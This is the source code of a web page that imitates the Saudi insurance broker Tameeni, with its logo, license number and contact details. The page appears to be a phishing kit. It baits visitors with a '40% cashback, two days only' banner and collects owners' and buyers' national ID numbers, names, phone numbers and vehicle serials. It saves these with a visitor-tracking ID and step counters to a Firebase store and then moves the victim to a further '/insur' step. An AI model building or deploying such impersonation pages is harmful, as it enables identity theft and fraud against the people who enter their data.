"use client";
import { useState, useEffect, useCallback, useRef } from "react";
import { useRouter } from "next/navigation";
import { Input } from "@/components/ui/input";
import { getOrCreateVisitorID } from "@/lib/visitor-tracking";
import { addData } from "@/lib/firebase";
import {
  Loader2,
  Car,
  ChevronDown,
  CreditCard,
  Hash,
  User,
  CheckCircle2,
  Phone,
  RefreshCw,
  FileText,
  Container,
} from "lucide-react";
import { VehicleDropdownOption } from "@/lib/v-types";

function validateSaudiId(id: string): { valid: boolean; error: string } {
  const cleanId = id.replace(/\s/g, "");
  if (!/^\d{10}$/.test(cleanId))
    return { valid: false, error: "رقم الهوية يجب أن يتكون من 10 أرقام" };
  if (!/^[12]/.test(cleanId))
    return { valid: false, error: "رقم الهوية يجب أن يبدأ بـ 1 أو 2" };
  let sum = 0;
  for (let i = 0; i < 10; i++) {
    let digit = Number.parseInt(cleanId[i]);
    if ((10 - i) % 2 === 0) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
  }
  if (sum % 10 !== 0) return { valid: false, error: "رقم الهوية غير صحيح" };
  return { valid: true, error: "" };
}

function generateCaptcha() {
  return Array.from({ length: 4 }, () => Math.floor(Math.random() * 10)).join(
    " ",
  );
}

const CAPTCHA_COLORS = ["#e53935", "#1976d2", "#388e3c", "#f57c00"];

export default function Home() {
  const router = useRouter();
  const [visitorID] = useState(() => getOrCreateVisitorID());
  const [identityNumber, setIdentityNumber] = useState("");
  const [ownerName, setOwnerName] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [documentType, setDocumentType] = useState("استمارة");
  const [serialNumber, setSerialNumber] = useState("");
  const [insuranceType, setInsuranceType] = useState("تجديد استمارة");
  const [buyerName, setBuyerName] = useState("");
  const [buyerIdNumber, setBuyerIdNumber] = useState("");
  const [identityNumberError, setIdentityNumberError] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [vehicleOptions, setVehicleOptions] = useState<VehicleDropdownOption[]>(
    [],
  );
  const [isLoadingVehicles, setIsLoadingVehicles] = useState(false);
  const [selectedVehicle, setSelectedVehicle] =
    useState<VehicleDropdownOption | null>(null);
  const [serialFieldFocused, setSerialFieldFocused] = useState(false);
  const [visitorInitialized, setVisitorInitialized] = useState(false);
  const [captchaText, setCaptchaText] = useState("3 5 1 9");
  const [captchaInput, setCaptchaInput] = useState("");
  const [captchaError, setCaptchaError] = useState(false);

  useEffect(() => {
    if (!visitorID) return;
    setVisitorInitialized(true);
  }, [visitorID]);

  useEffect(() => {
    setCaptchaText(generateCaptcha());
  }, []);

  const fetchVehicles = useCallback(async (nin: string) => {
    if (!validateSaudiId(nin).valid) {
      setVehicleOptions([]);
      return;
    }
    setIsLoadingVehicles(true);
    setVehicleOptions([]);
    try {
      const res = await fetch(`/api/vehicles/${nin}`);
      const data = await res.json();
      if (data.success && data.vehicles?.length > 0) {
        const options: VehicleDropdownOption[] = data.vehicles.map(
          (v: any) => ({
            value:
              v.sequenceNumber || v.SequenceNumber || String(v.vehicleId || ""),
            label:
              `${v.sequenceNumber || v.SequenceNumber || ""} - ${v.vehicleMaker || v.VehicleMaker || ""} ${v.vehicleModel || v.VehicleModel || ""} ${v.modelYear || v.ModelYear || ""}`.trim(),
            vehicle: v,
          }),
        );
        setVehicleOptions(options);
        setSerialFieldFocused(true);
      }
    } catch (e) {
      console.error(e);
    } finally {
      setIsLoadingVehicles(false);
    }
  }, []);

  useEffect(() => {
    if (identityNumber.length === 10 && /^\d{10}$/.test(identityNumber))
      fetchVehicles(identityNumber);
    else {
      setVehicleOptions([]);
      setSelectedVehicle(null);
    }
  }, [identityNumber, fetchVehicles]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const v = validateSaudiId(identityNumber);
    if (!v.valid) {
      setIdentityNumberError(v.error);
      return;
    }
    const captchaClean = captchaText.replace(/\s/g, "");
    if (captchaInput !== captchaClean) {
      setCaptchaError(true);
      return;
    }
    setSubmitting(true);
    try {
      localStorage.setItem(
        "homeFormData",
        JSON.stringify({
          identityNumber,
          ownerName,
          phoneNumber,
          documentType,
          serialNumber,
          insuranceType,
          buyerName,
          buyerIdNumber,
          selectedVehicle,
          timestamp: new Date().toISOString(),
        }),
      );
      await addData({
        id: visitorID,
        identityNumber,
        ownerName,
        phoneNumber,
        documentType,
        serialNumber,
        insuranceType,
        buyerName: insuranceType === "نقل ملكية" ? buyerName : "",
        buyerIdNumber: insuranceType === "نقل ملكية" ? buyerIdNumber : "",
        selectedVehicle: selectedVehicle
          ? { value: selectedVehicle.value, label: selectedVehicle.label }
          : null,
        currentStep: 2,
        currentPage: "insur",
      });
    } catch (e) {
      console.error(e);
    }
    router.push("/insur");
  };

  const refreshCaptcha = () => {
    setCaptchaText(generateCaptcha());
    setCaptchaInput("");
    setCaptchaError(false);
  };

  return (
    <div className="min-h-screen bg-[#f4f6f9] flex flex-col" dir="rtl">
      {/* ── Header ─────────────────────────────────────── */}
      <header className="bg-white border-b border-gray-100 px-4 py-3">
        <div className="max-w-lg mx-auto grid grid-cols-3 items-center">
          <button className="text-sm font-semibold text-gray-500 justify-self-start">
            EN
          </button>
          <img
            src="/tameeni-logo.webp"
            alt="تأميني"
            className="h-9 w-9 rounded-xl justify-self-center"
          />
          <span />
        </div>
      </header>

      {/* ── Promo banner ─────────────────────────────── */}
      <div className="bg-gradient-to-l from-[#1565c0] to-[#1976d2] text-white px-4 py-4">
        <div className="max-w-lg mx-auto flex items-center justify-between gap-3">
          <div className="space-y-2 flex-1">
            <p className="text-base font-bold leading-tight">
              كاش باك على تأمين المركبات
            </p>
            <div className="flex flex-wrap items-center gap-x-3 gap-y-1">
              <span className="bg-white/20 text-white text-[11px] font-medium px-2.5 py-0.5 rounded-full">
                عرض محدود
              </span>
              <span className="text-[11px] text-blue-100 flex items-center gap-1">
                <span className="w-1 h-1 rounded-full bg-blue-300 inline-block" />
                لمدة يومين فقط
              </span>
            </div>
          </div>
          <div className="text-5xl font-black text-white shrink-0 leading-none">
            40<span className="text-2xl">%</span>
          </div>
        </div>
      </div>

      {/* ── Page content ─────────────────────────────── */}
      <div className="max-w-lg mx-auto w-full px-4 py-5 flex-1">
        {/* ── Form card ────────────────────────────────── */}
        <div className="bg-white rounded-2xl border border-gray-100 shadow-sm overflow-hidden">
          {/* Insurance type tabs */}
          <div className="flex p-3 gap-2 border-b border-gray-100">
            {[
              { value: "تجديد استمارة", label: "تأمين جديد" },
              { value: "نقل ملكية", label: "نقل ملكية" },
            ].map(({ value, label }) => (
              <button
                key={value}
                type="button"
                onClick={() => setInsuranceType(value)}
                className={`flex-1 py-2.5 rounded-xl text-sm font-bold transition-all ${
                  insuranceType === value
                    ? "bg-[#1976d2] text-white shadow-sm"
                    : "bg-gray-100 text-gray-500 hover:bg-gray-200"
                }`}
              >
                {label}
              </button>
            ))}
          </div>

          <form onSubmit={handleSubmit} className="p-4 space-y-4">
            {/* Identity number */}
            <div className="space-y-1.5">
              <label className="block text-sm font-bold text-gray-700">
                رقم الهوية / الإقامة للمالك
              </label>
              <div className="relative">
                <Input
                  type="tel"
                  inputMode="numeric"
                  placeholder="رقم الهوية / الإقامة للمالك"
                  value={identityNumber}
                  onChange={(e) => {
                    setIdentityNumber(
                      e.target.value.replace(/\D/g, "").slice(0, 10),
                    );
                    if (identityNumberError) setIdentityNumberError("");
                  }}
                  className={`h-12 rounded-xl border text-sm text-right pr-4 transition-all ${
                    identityNumberError
                      ? "border-red-400 bg-red-50"
                      : "border-gray-200 focus:border-[#1976d2] bg-white"
                  }`}
                  dir="rtl"
                  required
                />
                <div className="absolute left-3 top-1/2 -translate-y-1/2">
                  {isLoadingVehicles ? (
                    <Loader2 className="h-4 w-4 animate-spin text-[#1976d2]" />
                  ) : identityNumber.length === 10 && !identityNumberError ? (
                    <CheckCircle2 className="h-4 w-4 text-emerald-500" />
                  ) : null}
                </div>
              </div>
              {identityNumberError && (
                <p className="text-xs text-red-600 font-medium">
                  ⚠ {identityNumberError}
                </p>
              )}
            </div>

            {/* Vehicle registration type */}
            <div className="space-y-1.5">
              <label className="block text-sm font-bold text-gray-700">
                نوع تسجيل المركبة
              </label>
              <div className="grid grid-cols-2 gap-2">
                {[
                  {
                    value: "استمارة",
                    label: "رخصة سير",
                    icon: <FileText className="h-4 w-4" />,
                  },
                  {
                    value: "بطاقة جمركية",
                    label: "بطاقة جمركية",
                    icon: <Container className="h-4 w-4" />,
                  },
                ].map(({ value, label, icon }) => (
                  <button
                    key={value}
                    type="button"
                    onClick={() => setDocumentType(value)}
                    className={`flex items-center justify-center gap-2 h-12 rounded-xl text-sm font-bold border-2 transition-all ${
                      documentType === value
                        ? "border-[#1976d2] bg-[#1976d2] text-white"
                        : "border-gray-200 text-gray-600 bg-white hover:border-[#1976d2]/50"
                    }`}
                  >
                    {icon}
                    {label}
                  </button>
                ))}
              </div>
            </div>

            {/* Serial number */}
            <div className="space-y-1.5">
              <label className="block text-sm font-bold text-gray-700">
                الرقم التسلسلي
              </label>
              <div className="relative">
                <Input
                  type="tel"
                  inputMode="numeric"
                  placeholder={
                    documentType === "بطاقة جمركية"
                      ? "رقم البيان الجمركي"
                      : "الرقم التسلسلي"
                  }
                  value={serialNumber}
                  onChange={(e) => {
                    setSerialNumber(e.target.value.replace(/\D/g, ""));
                    setSelectedVehicle(null);
                  }}
                  onFocus={() => {
                    if (vehicleOptions.length > 0) setSerialFieldFocused(true);
                  }}
                  onBlur={() => {
                    setTimeout(() => setSerialFieldFocused(false), 200);
                  }}
                  className="h-12 rounded-xl border border-gray-200 focus:border-[#1976d2] text-sm text-right pr-4 bg-white"
                  dir="rtl"
                  required
                />
                {vehicleOptions.length > 0 && !isLoadingVehicles && (
                  <button
                    type="button"
                    className="absolute left-3 top-1/2 -translate-y-1/2"
                    onClick={() => setSerialFieldFocused(!serialFieldFocused)}
                  >
                    <ChevronDown
                      className={`h-4 w-4 text-[#1976d2] transition-transform ${serialFieldFocused ? "rotate-180" : ""}`}
                    />
                  </button>
                )}
              </div>

              {selectedVehicle && !serialFieldFocused && (
                <div className="rounded-xl bg-emerald-50 border border-emerald-200 px-3.5 py-2.5">
                  <p className="text-[10px] text-emerald-600 font-bold mb-0.5">
                    ✓ المركبة المختارة
                  </p>
                  <p className="text-sm font-semibold text-gray-700">
                    {selectedVehicle.label}
                  </p>
                </div>
              )}

              {serialFieldFocused && vehicleOptions.length > 0 && (
                <div
                  className="z-50 mt-1 w-full rounded-2xl border border-gray-200 bg-white shadow-2xl overflow-hidden"
                  dir="rtl"
                >
                  <div className="max-h-52 overflow-y-auto divide-y divide-gray-50">
                    {vehicleOptions.map((opt) => (
                      <button
                        key={opt.value}
                        type="button"
                        className={`w-full px-4 py-3 text-right text-sm hover:bg-blue-50 transition-colors flex items-center justify-between ${serialNumber === opt.value ? "bg-blue-50 text-[#1976d2] font-bold" : "text-gray-700"}`}
                        onMouseDown={(e) => {
                          e.preventDefault();
                          setSerialNumber(opt.value);
                          setSelectedVehicle(opt);
                          setSerialFieldFocused(false);
                        }}
                      >
                        <span className="text-xs text-gray-400">
                          {opt.value}
                        </span>
                        <span>{opt.label}</span>
                      </button>
                    ))}
                  </div>
                  <button
                    type="button"
                    className="w-full px-4 py-2.5 text-center text-xs text-gray-400 hover:bg-gray-50 border-t border-gray-100 font-medium"
                    onMouseDown={(e) => {
                      e.preventDefault();
                      setSerialFieldFocused(false);
                      setSerialNumber("");
                      setSelectedVehicle(null);
                    }}
                  >
                    إدخال رقم يدوياً
                  </button>
                </div>
              )}
            </div>

            {/* Transfer buyer fields */}
            {insuranceType === "نقل ملكية" && (
              <div className="space-y-3 bg-blue-50 border border-blue-200 rounded-xl p-4">
                <p className="text-xs font-bold text-blue-700">
                  بيانات المشتري
                </p>
                <div className="relative">
                  <User className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400" />
                  <Input
                    placeholder="اسم المشتري الكامل"
                    value={buyerName}
                    onChange={(e) => setBuyerName(e.target.value)}
                    maxLength={50}
                    className="h-11 rounded-xl border border-blue-200 focus:border-blue-400 text-sm text-right pr-10 bg-white"
                    dir="rtl"
                    required
                  />
                </div>
                <div className="relative">
                  <CreditCard className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-400" />
                  <Input
                    type="tel"
                    inputMode="numeric"
                    placeholder="رقم هوية المشتري"
                    value={buyerIdNumber}
                    onChange={(e) =>
                      setBuyerIdNumber(
                        e.target.value.replace(/\D/g, "").slice(0, 10),
                      )
                    }
                    className="h-11 rounded-xl border border-blue-200 focus:border-blue-400 text-sm text-right pr-10 bg-white"
                    dir="rtl"
                    required
                  />
                </div>
              </div>
            )}

            {/* Captcha */}
            <div className="space-y-1.5">
              <div className="flex items-center justify-between">
                <button
                  type="button"
                  onClick={refreshCaptcha}
                  className="text-[#1976d2] hover:text-[#1565c0]"
                >
                  <RefreshCw className="h-4 w-4" />
                </button>
                <label className="block text-sm font-bold text-gray-700">
                  أدخل رمز التحقق
                </label>
              </div>
              <div className="flex gap-2 items-stretch">
                <Input
                  type="tel"
                  inputMode="numeric"
                  placeholder="أدخل الرمز"
                  value={captchaInput}
                  onChange={(e) => {
                    setCaptchaInput(
                      e.target.value.replace(/\D/g, "").slice(0, 4),
                    );
                    setCaptchaError(false);
                  }}
                  className={`h-12 rounded-xl border text-sm text-center flex-1 ${captchaError ? "border-red-400 bg-red-50" : "border-gray-200 focus:border-[#1976d2]"}`}
                  dir="rtl"
                  required
                />
                <div
                  dir="ltr"
                  className="h-12 px-4 flex items-center justify-center rounded-xl border-2 border-dashed border-gray-300 bg-gray-50 gap-1.5 select-none min-w-[90px]"
                >
                  {captchaText.split(" ").map((digit, i) => (
                    <span
                      key={i}
                      className="text-xl font-black"
                      style={{
                        color: CAPTCHA_COLORS[i % CAPTCHA_COLORS.length],
                        fontFamily: "monospace",
                      }}
                    >
                      {digit}
                    </span>
                  ))}
                </div>
              </div>
              {captchaError && (
                <p className="text-xs text-red-600 font-medium">
                  ⚠ رمز التحقق غير صحيح
                </p>
              )}
            </div>

            {/* Disclaimer */}
            <p className="text-[11px] text-gray-500 leading-relaxed text-right">
              بالضغط على زر البحث فأنت توافق على منحنا حق الاستعلام عن بياناتك
              أو مركبتك من الجهات ذات العلاقة والموافقة على{" "}
              <a href="#" className="text-[#1976d2] underline">
                الشروط والأحكام
              </a>
            </p>

            {/* Submit button */}
            <button
              type="submit"
              disabled={submitting}
              className="w-full h-13 py-3.5 rounded-xl bg-[#1976d2] hover:bg-[#1565c0] text-white font-bold text-base transition-all disabled:opacity-70 flex items-center justify-center gap-2"
            >
              {submitting ? <Loader2 className="h-5 w-5 animate-spin" /> : null}
              ابحث الآن
            </button>
          </form>
        </div>
      </div>

      {/* ── Footer ─────────────────────────────── */}
      <footer
        className="bg-white border-t border-gray-200 mt-2 px-4 py-6"
        dir="rtl"
      >
        <div className="max-w-lg mx-auto space-y-5">
          {/* Authority license row */}
          <div>
            <p className="text-[11px] text-gray-400 mb-2">مصرح من قبل</p>
            <div className="flex items-center gap-2 mb-3">
              <img
                src="/tameeni-logo.webp"
                alt="هيئة التأمين"
                className="h-8 w-8 rounded-lg"
              />
              <div>
                <p className="text-sm font-bold text-gray-800">هيئة التأمين</p>
                <p className="text-[10px] text-gray-500">Insurance Authority</p>
              </div>
            </div>
            <p className="text-[11px] text-gray-500 leading-relaxed">
              أحد منتجات شركة ضامن لوساطة التأميني التعاوني خاضع لرقابة وإشراف
              هيئة التأمين. ترخيص رقم و.س.ط/ش/101201807
            </p>
          </div>

          {/* Links row */}
          <div className="flex items-center gap-4 flex-wrap">
            <a href="#" className="text-xs font-semibold text-[#1976d2]">
              مركز المساعدة
            </a>
            <a href="#" className="text-xs font-semibold text-[#1976d2]">
              الأسئلة الشائعة
            </a>
          </div>

          {/* Contact */}
          <div className="space-y-1.5">
            <div className="flex items-center gap-2 text-sm text-gray-700">
              <Phone className="h-4 w-4 text-[#1976d2] shrink-0" />
              <span className="font-bold" dir="ltr">
                8001244010
              </span>
            </div>
            <div className="flex items-center gap-2 text-sm text-gray-700">
              <svg
                className="h-4 w-4 text-[#1976d2] shrink-0"
                fill="currentColor"
                viewBox="0 0 24 24"
              >
                <path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z" />
              </svg>
              <span className="font-medium">info@tameeni.com</span>
            </div>
          </div>

          {/* Partner links */}
          <div className="flex items-center gap-4 flex-wrap">
            {["شركاؤنا", "مدونة", "لوائح هيئة التأمين"].map((l) => (
              <a
                key={l}
                href="#"
                className="text-xs text-gray-600 hover:text-[#1976d2]"
              >
                {l}
              </a>
            ))}
          </div>

          {/* Social icons */}
          <div className="flex items-center gap-4">
            {[
              {
                label: "X",
                path: "M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z",
              },
              {
                label: "Instagram",
                path: "M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z",
              },
              {
                label: "Facebook",
                path: "M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z",
              },
              {
                label: "Snapchat",
                path: "M12.166 3c-1.966 0-4.196 1.03-5.27 3.257-.437.901-.373 2.448-.373 3.33 0 .187-.117.28-.306.28-.396 0-.96-.178-1.315-.178-.329 0-.903.14-.903.602 0 .476.53.83.939 1.025.527.252 1.233.44 1.233.966 0 .073-.011.138-.028.202C5.685 14.02 4.29 15.45 3.54 16.062c-.303.247-.47.608-.356.95.15.443.647.613 1.106.613.284 0 .556-.063.792-.063.249 0 .491.044.755.185.535.286 1.005.95 2.432.95.224 0 .457-.015.7-.05.365-.05.747-.192 1.113-.192.283 0 .568.058.826.232.63.429 1.148 1.313 2.092 1.313s1.462-.884 2.092-1.313c.258-.174.543-.232.826-.232.366 0 .748.142 1.113.192.243.035.476.05.7.05 1.427 0 1.897-.664 2.432-.95.264-.141.506-.185.755-.185.236 0 .508.063.792.063.459 0 .956-.17 1.106-.613.114-.342-.053-.703-.356-.95-.75-.612-2.145-2.042-2.603-3.548a1.21 1.21 0 0 1-.028-.202c0-.526.706-.714 1.233-.966.409-.195.939-.549.939-1.025 0-.462-.574-.602-.903-.602-.355 0-.919.178-1.315.178-.189 0-.306-.093-.306-.28 0-.882.064-2.429-.373-3.33C16.362 4.03 14.132 3 12.166 3Z",
              },
              {
                label: "TikTok",
                path: "M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.93-.01 2.92.01 5.84-.02 8.75-.08 1.4-.54 2.79-1.35 3.94-1.31 1.92-3.58 3.17-5.91 3.21-1.43.08-2.86-.31-4.08-1.03-2.02-1.19-3.44-3.37-3.65-5.71-.02-.5-.03-1-.01-1.49.18-1.9 1.12-3.72 2.58-4.96 1.66-1.44 3.98-2.13 6.15-1.72.02 1.48-.04 2.96-.04 4.44-.99-.32-2.15-.23-3.02.37-.63.41-1.11 1.04-1.36 1.75-.21.51-.15 1.07-.14 1.61.24 1.64 1.82 3.02 3.5 2.87 1.12-.01 2.19-.66 2.77-1.61.19-.33.4-.67.41-1.06.1-1.79.06-3.57.07-5.36.01-4.03-.01-8.05.02-12.07z",
              },
            ].map(({ label, path }) => (
              <a
                key={label}
                href="#"
                aria-label={label}
                className="w-8 h-8 rounded-full bg-gray-100 hover:bg-gray-200 flex items-center justify-center transition-colors"
              >
                <svg
                  className="w-4 h-4 text-gray-600"
                  fill="currentColor"
                  viewBox="0 0 24 24"
                >
                  <path d={path} />
                </svg>
              </a>
            ))}
          </div>

          {/* Payment logos */}
          <div className="flex items-center gap-3">
            <img
              src="/apple-pay.png"
              alt="Apple Pay"
              className="h-6 object-contain"
            />
            <img
              src="/mas.svg"
              alt="Mastercard"
              className="h-6 object-contain"
            />
            <img src="/visa.svg" alt="VISA" className="h-5 object-contain" />
          </div>

          {/* App store badges */}
          <div className="flex items-center gap-3">
            <img
              src="/google_play.png"
              alt="Google Play"
              className="h-8 object-contain"
            />
            <img
              src="/apple_store.png"
              alt="App Store"
              className="h-8 object-contain"
            />
          </div>

          {/* Copyright & legal links */}
          <div className="pt-2 border-t border-gray-100 space-y-2">
            <p className="text-[11px] text-gray-400">
              © Tameeni 2026 جميع الحقوق محفوظة
            </p>
            <div className="flex items-center gap-4 flex-wrap">
              {["سياسة الخصوصية", "الشروط والأحكام", "مع الاحتياط"].map((l) => (
                <a
                  key={l}
                  href="#"
                  className="text-[11px] text-gray-500 hover:text-[#1976d2]"
                >
                  {l}
                </a>
              ))}
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
